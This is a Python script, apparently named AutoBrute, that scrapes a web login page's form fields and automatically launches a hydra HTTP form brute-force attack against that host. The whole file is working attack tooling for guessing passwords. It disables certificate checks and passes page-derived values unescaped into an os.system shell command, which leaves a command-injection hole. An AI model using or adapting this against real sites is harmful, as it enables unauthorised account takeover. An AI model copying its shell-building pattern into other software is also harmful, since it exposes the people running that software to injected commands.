#!/usr/bin/env python3
from bs4 import BeautifulSoup
import argparse
import urllib.parse as urllib
import requests
import os

# Compare the innerText of previous request
# with the redirect of the failed login request.
# This will allow for a comparison between both sites
# giving you the failure text of the page.

def get_login_form(formelements, usertypes, passtypes):
    for form in formelements:
        userparam, passparam = "", ""
        children = form.findChildren('input')
        for inputelem in children:
            inputtype = inputelem.get('type')
            if inputtype in usertypes and not userparam:
                userparam = inputelem.get('name')
            elif inputtype in passtypes and not passparam:
                passparam = inputelem.get('name')

            if userparam and passparam:
                return {
                    "form":form,
                    "user":userparam,
                    "pass":passparam
                }

requests.packages.urllib3.disable_warnings()
parser = argparse.ArgumentParser(description="AutoBrute automates hydra http brute forcing with ease. All you have to run is one simple command")
parser.add_argument('--url', '-u', help="URL of the login page to be brute forced.", required=True, type=str)
parser.add_argument('--failure', '-f', help="Text on page when the login is invalid.", required=True, type=str, metavar='CONDITION')
parser.add_argument('hydra', nargs='*')
args = parser.parse_args()

hydraargs = ' '.join(args.hydra)
domain = urllib.urlparse(args.url).netloc
if domain:
    if ':' in domain:
        domain = domain[:domain.index(':')]

    print("[\033[34m*\033[37m] Using doman: " + domain)
else:
    print("[\033[31m-\033[37m] Failed to source domain from the provided URL.")
    exit(0)

try:
    res = requests.get(args.url, verify=False)
except Exception:
    print("[\033[31m-\033[37m] Unable to connect to URL.")
    exit(0)

soup = BeautifulSoup(res.text, 'html.parser')
formelements = soup.find_all('form')
if formelements:
    print("[\033[32m+\033[37m] Sourced " + str(len(formelements)) + " form elements.")
else:
    print("[\033[31m-\033[37m] No form element found. Is this a login page?")
    exit(0)

formobj = get_login_form(formelements, ["text", "username", "email"], ["password"])
if not formobj:
    print("[\033[34m*\033[37m] Unable to find form element with password input.")
    print("[\033[34m*\033[37m] Checking for text input.")
    formobj = get_login_form(formelements, ["text", "username", "email"], ["password","text"])

if not formobj:
    print("[\033[31m-\033[37m] No login form found.")
    exit(0)


print("[\033[32m+\033[37m] Found username field: " + formobj["user"] + "\n[\033[32m+\033[37m] Found password field: " + formobj["pass"])
postfields = ""

for inputelem in formobj["form"].findChildren('input'):
    inputparam = inputelem.get('name')
    if inputparam:
        if inputparam != formobj["user"] and inputparam != formobj["pass"]:
            if inputelem.get('value'):
                postfields += '&' + inputparam + '=' + inputelem.get('value')
            else:
                postfields += '&' + inputparam + '='
        elif inputparam == formobj["user"]:
            postfields += '&' + inputparam + '=^USER^'
        elif inputparam == formobj["pass"]:
            postfields += '&' + inputparam + '=^PASS^'

formaction = formobj["form"].get('action')
formmethod = formobj["form"].get('method')

if formmethod:
    formmethod = formmethod.lower()
    print("[\033[32m+\033[37m] Found form method: " + formmethod)
else:
    print("[\033[34m*\033[37m] Unable to find form method. Defaulting to get.")
    formmethod = "get"

if formaction:
    print("[\033[32m+\033[37m] Found form action: " + formaction + "\n[\033[34m*\033[37m] Making form action compatible with hydra.")
    if formaction[0] != '/' and not '://' in formaction:
        formaction = '/' + formaction
    elif '://' in formaction:
        formaction = urllib.urlparse(formaction).path
else:
    print("[\033[34m*\033[37m] No form action found. Using provided path.")
    formaction = urllib.urlparse(args.url).path

print(f'[\033[32m+\033[37m] Created http-{formmethod}-form: \"{formaction}:{postfields}:F={args.failure}\"')
os.system(f'hydra {domain} http-{formmethod}-form \"{formaction}:{postfields[1:]}:F={args.failure}\" {hydraargs}')
